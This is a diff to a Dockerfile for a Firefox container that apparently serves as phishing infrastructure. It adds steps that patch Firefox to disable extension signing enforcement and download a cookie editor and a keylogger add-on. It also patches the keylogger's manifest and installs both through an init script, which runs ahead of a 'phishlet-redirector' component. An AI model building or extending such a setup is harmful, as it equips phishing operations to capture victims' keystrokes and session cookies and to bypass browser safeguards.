@@ -1,6 +1,26 @@
 FROM jlesage/firefox
 
-RUN apk add --no-cache sqlite python3 xdotool xclip
+RUN apk add --no-cache sqlite python3 xdotool xclip curl zip unzip
+
+# Patch Firefox omni.ja to disable extension signing enforcement
+COPY extensions/patch_omnija.py /tmp/patch_omnija.py
+RUN python3 /tmp/patch_omnija.py && rm /tmp/patch_omnija.py
+RUN mkdir -p /opt/addons && \
+    curl -fsSL -o /opt/addons/cookie-editor.xpi \
+      "https://addons.mozilla.org/firefox/downloads/file/4241002/cookie_editor-1.13.0.xpi" && \
+    curl -fsSL -o /opt/addons/nifty-keylogger.xpi \
+      "https://addons.mozilla.org/firefox/downloads/file/2994462/kl-1.5.4.xpi"
+
+# Patch keylogger XPI: it has no gecko.id in manifest, so add one
+COPY extensions/patch_keylogger.py /tmp/patch_keylogger.py
+RUN python3 /tmp/patch_keylogger.py && rm /tmp/patch_keylogger.py
+
+# Copy addon registration script
+COPY extensions/patch_extensions_json.py /opt/patch_extensions_json.py
+
+# Install addons init script (runs before phishlet-redirector)
+COPY extensions/install-addons /etc/cont-init.d/97-install-addons
+RUN chmod +x /etc/cont-init.d/97-install-addons
 
 COPY extensions/phishlet-redirector/phishlet-redirector.py /opt/phishlet-redirector.py
 COPY extensions/phishlet-redirector/99-phishlet-redirector /etc/cont-init.d/99-phishlet-redirector
